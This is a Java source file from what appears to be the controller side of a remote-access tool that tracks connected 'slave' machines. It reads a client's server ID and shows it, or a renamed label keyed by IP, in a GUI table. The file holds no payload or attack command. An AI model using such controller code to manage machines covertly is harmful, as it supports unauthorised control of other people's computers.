package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.settings.ServerID;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class Packet15InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setServerID(slave.readLine());
		ServerID.ServerIDEntry entry = ServerID.getGlobal().findEntry(slave.getRawIP());
		if (entry == null) {
			Frame.mainModel.setValueAt(slave.getServerID(), Util.getRow(3, slave.getIP()), 1);
		} else {
			slave.setRenamedID(entry.getName());
			Frame.mainModel.setValueAt(slave.getRenamedID(), Util.getRow(3, slave.getIP()), 1);
		}

	}
}
